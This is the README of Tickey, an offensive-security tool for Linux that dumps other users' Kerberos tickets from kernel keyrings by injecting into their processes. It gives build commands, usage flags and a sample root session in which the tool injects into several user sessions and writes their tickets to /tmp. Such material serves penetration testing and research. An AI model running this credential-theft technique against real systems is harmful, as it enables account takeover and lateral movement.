# Tickey
Tool to extract Kerberos tickets from Linux kernel keys.

Based in the paper [Kerberos Credential Thievery (GNU/Linux)](https://www.delaat.net/rp/2016-2017/p97/report.pdf).

## Building
```
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
```

After that, binary should be in `dist/Release/GNU-Linux/`.

## Execution

Arguments:
* -i => To perform process injection if it is needed
* -s => To not print in output (for injection)

**Important**: when injects in another process, tickey performs an `execve` syscall which invocates its own binary from the context of another user. Therefore, to perform a successful injection, the binary must be in a folder which all users have access, like /tmp.


Execution example: 
```
[root@Lab-LSV01 /]# /tmp/tickey -i
[*] krb5 ccache_name = KEYRING:session:sess_%{uid}
[+] root detected, so... DUMP ALL THE TICKETS!!
[*] Trying to inject in tarlogic[1000] session...
[+] Successful injection at process 25723 of tarlogic[1000],look for tickets in /tmp/__krb_1000.ccache
[*] Trying to inject in velociraptor[1120601115] session...
[+] Successful injection at process 25794 of velociraptor[1120601115],look for tickets in /tmp/__krb_1120601115.ccache
[*] Trying to inject in trex[1120601113] session...
[+] Successful injection at process 25820 of trex[1120601113],look for tickets in /tmp/__krb_1120601113.ccache
[X] [uid:0] Error retrieving tickets
```


## License
This program is free software: you can redistribute it and/or modify it under the terms of the GNU Affero General Public License as published by the Free Software Foundation, either version 3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU Affero General Public License for more details.

You should have received a copy of the GNU Affero General Public License along with this program. If not, see <https://www.gnu.org/licenses/>.

## Author
Eloy Pérez González [@Zer1t0](https://github.com/Zer1t0)

## Acknowledgment

Thanks to [@TheXC3LL](https://twitter.com/TheXC3LL) for his support with the binary injection.
